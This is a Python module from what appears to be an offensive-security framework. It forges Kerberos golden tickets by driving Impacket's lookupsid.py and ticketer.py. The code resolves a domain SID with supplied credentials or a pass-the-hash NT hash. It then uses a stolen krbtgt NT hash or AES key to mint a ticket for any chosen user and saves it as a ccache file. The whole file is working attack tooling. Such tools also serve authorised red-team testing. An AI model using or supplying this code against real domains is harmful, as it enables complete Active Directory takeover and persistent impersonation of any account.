import os
import re
import shlex
from pathlib import Path

from module import BaseModule


class GoldenTicket(BaseModule):
    path = "kerberos/golden"
    description = "Forge a Kerberos golden ticket."
    options = {
        "domain": {"default": "", "description": "Domain name (FQDN)", "required": True},
        "domain_sid": {"default": "", "description": "Domain SID (optional; auto-resolved when empty)", "required": False},
        "target_user": {"default": "randomuser", "description": "Username to embed in the forged ticket", "required": True},
        "nthash": {"default": "", "description": "krbtgt NT hash (RC4 key)", "required": False},
        "aes_key": {"default": "", "description": "krbtgt AES key (128/256-bit)", "required": False},
        "dc_ip": {"default": "", "description": "Domain Controller IP/hostname used for SID lookup", "required": False},
        "lookup_username": {"default": "", "description": "Username for optional SID discovery", "required": False},
        "lookup_password": {"default": "", "description": "Password or NT hash for optional SID discovery", "required": False},
    }

    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    def _validate_key_material(self):
        has_nthash = bool(self.opts.nthash.strip())
        has_aes = bool(self.opts.aes_key.strip())

        if has_nthash == has_aes:
            self.pane_a.write(
                "[red][!] Set exactly one of `nthash` or `aes_key`.[/red]"
            )
            return False

        if has_nthash and not self.is_nt_hash(self.opts.nthash):
            self.pane_a.write("[red][!] `nthash` must be a 32-hex NT hash.[/red]")
            return False

        if has_aes and not re.fullmatch(r"[0-9a-fA-F]{32}|[0-9a-fA-F]{64}", self.opts.aes_key):
            self.pane_a.write(
                "[red][!] `aes_key` must be a 32-hex (AES128) or 64-hex (AES256) key.[/red]"
            )
            return False

        return True

    async def _lookup_domain_sid(self):
        if not self.opts.lookup_username or not self.opts.lookup_password:
            self.pane_a.write(
                "[red][!] `domain_sid` is empty. Set `domain_sid` directly or provide `lookup_username` + `lookup_password`.[/red]"
            )
            return ""

        target = (self.opts.dc_ip or self.opts.domain).strip()
        if not target:
            self.pane_a.write("[red][!] Missing `domain`/`dc_ip` target for SID lookup.[/red]")
            return ""

        principal = f"{self.opts.domain}/{self.opts.lookup_username}@{target}"
        lookup_secret = self.opts.lookup_password.strip()

        cmd = ["../tools/.bin/lookupsid.py"]
        if self.is_nt_hash(lookup_secret):
            cmd += [
                "-hashes",
                f"aad3b435b51404eeaad3b435b51404ee:{lookup_secret}",
                principal,
                "0",
            ]
        else:
            cmd += [f"{self.opts.domain}/{self.opts.lookup_username}:{lookup_secret}@{target}", "0"]

        sid = ""
        async for line in self.run_command(shlex.join(cmd), self.pane_b):
            self.pane_b.write(line)
            if "Domain SID" in line:
                match = re.search(r"(S-\d(?:-\d+)+)", line)
                if match:
                    sid = match.group(1)

        if not sid:
            self.pane_a.write("[red][!] Failed to resolve domain SID via lookupsid.py.[/red]")
            return ""

        self.pane_a.write(f"[green]✓ Resolved domain SID: {sid}[/green]")
        return sid

    async def run(self):
        if not self.validate_options():
            return

        if not self._validate_key_material():
            return

        os.chdir(self.logs_dir)

        domain_sid = self.opts.domain_sid.strip()
        if not domain_sid:
            domain_sid = await self._lookup_domain_sid()
            if not domain_sid:
                return

        command_parts = [
            "../tools/.bin/ticketer.py",
            "-domain-sid",
            domain_sid,
            "-domain",
            self.opts.domain,
        ]

        if self.opts.nthash:
            command_parts += ["-nthash", self.opts.nthash.strip()]
        else:
            command_parts += ["-aesKey", self.opts.aes_key.strip()]

        command_parts += [self.opts.target_user]

        async for line in self.run_command(shlex.join(command_parts), self.pane_b):
            self.pane_b.write(line)

        ticket_path = Path(self.logs_dir) / f"{self.opts.target_user}.ccache"
        if ticket_path.exists():
            self.pane_a.write(
                f"[green]✓ Golden ticket saved to `{ticket_path.name}`[/green]"
            )
        else:
            self.pane_a.write(
                "[yellow][!] Ticketer finished, but expected ccache was not found in logs/. Check pane output.[/yellow]"
            )
